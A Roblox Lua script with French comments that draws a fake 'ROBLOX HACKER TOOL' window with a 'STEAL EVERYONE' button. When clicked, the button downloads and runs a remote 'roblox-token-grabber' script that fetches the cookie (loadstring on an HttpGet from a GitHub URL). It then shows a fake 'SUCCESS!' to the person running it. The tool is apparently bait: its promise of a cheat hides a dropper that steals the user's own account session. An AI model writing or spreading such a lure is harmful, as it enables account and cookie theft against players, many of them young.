-- Script GUI modifié à exécuter dans Roblox
-- Crée un bouton "STEAL EVERYONE" et ajoute une croix pour fermer le GUI

local Players = game:GetService("Players")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "HackerToolGUI"
screenGui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0.3, 0, 0.2, 0)
frame.Position = UDim2.new(0.35, 0, 0.4, 0)
frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
frame.BorderSizePixel = 0
frame.Parent = screenGui

local title = Instance.new("TextLabel")
title.Text = "🔓 ROBLOX HACKER TOOL V3.5 🔓"
title.Size = UDim2.new(1, 0, 0.3, 0)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(255, 50, 50)
title.TextScaled = true
title.Parent = frame

local stealButton = Instance.new("TextButton")
stealButton.Text = "STEAL EVERYONE"
stealButton.Size = UDim2.new(0.8, 0, 0.4, 0)
stealButton.Position = UDim2.new(0.1, 0, 0.5, 0)
stealButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
stealButton.TextColor3 = Color3.fromRGB(255, 255, 255)
stealButton.Parent = frame

-- Bouton de fermeture (croix)
local closeButton = Instance.new("TextButton")
closeButton.Text = "X"  -- Croix simple
closeButton.Size = UDim2.new(0.1, 0, 0.2, 0)
closeButton.Position = UDim2.new(0.9, 0, 0, 0)  -- En haut à droite
closeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.Parent = frame

closeButton.MouseButton1Click:Connect(function()
    frame:Destroy()  -- Ferme le GUI
end)

-- Quand le joueur clique sur "STEAL EVERYONE"
stealButton.MouseButton1Click:Connect(function()
    stealButton.Text = "HACKING..."
    wait(2)
    
    -- Charger le script token grabber
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TON_USERNAME/roblox-token-grabber/main/getRobloxCookie.lua"))()
    
    -- Simuler un hack réussi
    stealButton.Text = "SUCCESS!"
    wait(1)
    frame:Destroy()  -- Fermer le GUI après le "hack"
end)
